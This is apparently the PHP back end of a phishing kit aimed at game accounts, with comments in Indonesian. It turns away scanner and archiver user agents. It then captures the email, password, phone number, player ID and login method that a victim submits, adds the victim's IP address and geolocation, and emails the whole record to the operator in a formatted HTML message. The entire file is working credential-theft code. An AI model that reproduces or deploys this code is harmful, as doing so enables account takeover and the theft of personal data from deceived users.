<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: oops.php');
die();
}

// MENGAMBIL KONTROL
include 'system/setting.php';
include 'system/lenzzip.php';
include 'changeHere.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$login = $_POST['login'];
$codetel = $_POST['codetel'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $playid == "" && $phone == "" && $level == "" && $login == "" && $codetel == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = " $lenzz_countryCode - $lenzz_flag | +$lenzz_callcode | LOGIN $login | DATA $email";
$pesan = '
<center>
<table class="nl-container" style="border-collapse: collapse; table-layout: fixed; border-spacing: 0; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; min-width: 320px; margin: 0 auto; background-color: #ffffff; width: 100%;" cellspacing="0">
<tbody>
<tr style="vertical-align: top;">
<td style="border-collapse: collapse !important; vertical-align: top;">
<div style="background-position: bottom; background-repeat: no-repeat; background-color: #f4f4f4;">
<div class="block-grid" style="margin: 0 auto; min-width: 320px; max-width: 370px; word-wrap: break-word; background-color: transparent;">
<table style="background: #000; background-size: 100% 100%; border-collapse: collapse; border-color: black; width: 100%; color: #000; text-align: center;" width="100%" height: 90px; border="1">
<tr style="border-top:0;">
<th style="border-color: black; background: url('.$banner.') no-repeat center center; background-size: 100% 100%; width: 100%; height: 120px;">
</th>
</tr>
</table>
<table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="0">
<tr style="border-top:0;">
<th style="border:0;border-top:0; line-height: 10px; font-size: 14px; border-collapse: collapse; border-color: black; background: #000; width: 100%; color: #fff; text-align: center; padding: 12px;"><strong>Account Information</strong></th>
</tr>
</table>
<table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
<tr style="border-top:0;">
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>EMAIL</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$codetel.' '.$email.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>PASSWORD</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$password.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>PHONE</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$phone.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>PLAYER ID</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$playid.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>LEVEL</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$level.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>LOGIN</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$login.'</strong></th>
</tr>
</table>
<table style="border-top:0; border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
<tr style="border-top:0;">
<th style="border:0;border-top:0; line-height: 10px; font-size: 14px; border-collapse: collapse; border-color: black; background: #000; width: 100%; color: #fff; text-align: center; padding: 12px;"><strong>Additional Information</strong></th>
</tr>
</table>
<table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
<tr style="border-top:0;">
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>IP ADDRESS</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$lenzz_ipaddress.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>COUNTRY</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$lenzz_country.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>PROVINCE</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$lenzz_regionName.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>CITY</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$lenzz_city.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>TIME ZONE</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$lenzz_timezone.'</strong></th>
</tr>
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>ENTRY TIME</strong></th>
<th style="height: 25px; width: 65%;text-align:left;padding-left:15px;"><strong>'.$jamasuk.'</strong></th>
</tr>
</table>
<table style="border-top:0; border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
<tr style="border-top:0;">
<th style="border:0;border-top:0; line-height: 10px; font-size: 14px; border-collapse: collapse; border-color: black; background: #000; width: 100%; color: #fff; text-align: center; padding: 12px;"><strong>EJE25</strong></th>
</tr>
</table>
</div>
</div>
</td>
</tr>
</tbody>
</table>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($my_email, $subjek, $pesan, $headers);
}
?>